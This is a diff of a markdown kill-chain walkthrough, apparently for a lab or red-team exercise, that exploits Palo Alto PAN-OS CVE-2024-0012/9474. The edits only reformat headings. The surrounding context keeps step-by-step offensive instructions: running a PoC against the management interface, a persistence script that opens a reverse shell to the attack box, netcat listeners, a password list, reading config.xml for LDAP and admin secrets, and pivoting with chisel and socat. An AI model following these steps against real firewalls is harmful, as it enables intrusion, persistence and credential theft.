@@ -20,9 +20,9 @@ CVE: CVE-2024-0012 and `CVE-2024-9474`
 - download from source file
 - to copy and paste information simpler to from your HOST to the VM
  
-# Phase 0: Initial Setup for Kill Chain
+## Phase 0: Initial Setup for Kill Chain
 
-## Exploit Setup:
+### Exploit Setup:
 
 1. Create a new folder on your `attack box`
    - This will stage all of the required files and scripts.
@@ -33,7 +33,7 @@ CVE: CVE-2024-0012 and `CVE-2024-9474`
 7. `chmod +x PoC.py`
    
 
-## Persistence Script Setup:
+### Persistence Script Setup:
 
 1. Perform the following command: `nano pan_os_comm.py`
 2. In nano, copy and paste the below script: ***NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :) *** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
@@ -82,7 +82,8 @@ Through OSINT and recon, we have located a list of compromised passwords from us
 
 	```
 
-PASSWORD LIST:   
+#### PASSWORD LIST:  
+
 ```
 Summer2025
 JohnDoe123
@@ -195,7 +196,7 @@ KG+Vs7e5$dF4
 
 ## Phase 1: Initial Access via Palo Alto Exploit
 
-Section 1. Setting Up Listeners
+### Section 1. Setting Up Listeners
 
 1. Open up your terminal, and if you dont already have 4, go to your terminal preferences and change the settings to start with 4 panes.
 2. In one of the terminal panes, set up your initial lsitener using Netcat to catch the callback shell from the exploit. Be sure to note the port that you are using for this listener, as it will be needed when initiating the exploit.
@@ -204,7 +205,7 @@ Section 1. Setting Up Listeners
 4. Run the following command to start the second listener:
 	`nc -lnv <port used in script>`
 
-Section 2. Execute the PoC Script
+### Section 2. Execute the PoC Script
 
 1. In one of the empty terminal panes, execute the PoC.py script to trigger the exploit:
    	`python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_box> <port_of_initial_listener>`
@@ -288,12 +289,6 @@ In this section, we will leverage the exfiltrated users.txt file that was pulled
 
 
 
-
-
-
-
-
-
 ## Phase 5: Internal Reconnaissance & Enumeration
 Once inside the firewall OS:
 ### Identify internal interfaces and routes
@@ -313,6 +308,7 @@ cat /config/config.xml | grep -i 'mgmt\|admin\|ldap\|radius'
 # Attempt to pivot through firewall if routing/NAT is enabled
 - sshuttle/reverse SOCKS proxy (chisel, socat) to tunnel traffic into the internal 
 network.
+
 
 ## Phase 6: Target Discovery Inside Orange Space
 Assuming pivot success to internal hosts:
